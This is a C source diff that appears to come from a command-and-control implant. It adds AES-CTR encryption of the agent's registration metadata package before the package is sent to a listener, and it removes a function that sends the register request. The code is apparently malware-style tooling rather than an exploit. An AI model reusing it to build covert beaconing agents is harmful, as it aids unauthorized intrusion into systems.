@@ -182,6 +182,21 @@ INT RegisterAgent() {
         return -1;
     }
 
+    AddInt32ToBuffer(pPack->Buffer, pPack->Length); // add the length of the buffer to the front of buffer in empty space created when calling create metadata package.
+
+    if (pPack->Encrypt)
+    {
+        INT err;
+        //TODO perform encryption.
+        if ((err = AESCTR(
+            (BYTE*)pPack->Buffer + (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(agent->config->AgentName) + agent->EncryptedAESKeySize + agent->EncryptedIVSize),	//buffer to encrypt. BUFF START + HEADERS + AgentName Length + AgentName String Length (part of Headers) + ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV
+            pPack->Length - (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(agent->config->AgentName) + agent->EncryptedAESKeySize + agent->EncryptedIVSize),			//SIZE OF BUFFER TO ENCRYPT. BUFFER LEN - (HEADERS + AgentName Length + AgentName String Length (part of Headers)) - (ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV)
+            agent->AESKey, AES_256_KEY_SIZE, agent->IV)																//AES KEY, AES KEY SIZE, IV
+            ) != 0) {
+            return err;
+        }
+    }
+
     //TODO maybe destroy metadata package once it's been sent?
 	if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to send package\n");
@@ -190,16 +205,4 @@ INT RegisterAgent() {
 	}
 
     return err;
-}
-
-BOOL SendRegisterRequest(VOID* Buffer, ULONG BufferLength) {
-
-    if (PerformRequest(Buffer, BufferLength, NULL)) {
-        agent->session->Active = TRUE;
-        return TRUE;
-    }
-    else {
-        agent->config->listenerConfig->CurrentHost->NumFailures++;
-        return FALSE;
-    }
 }
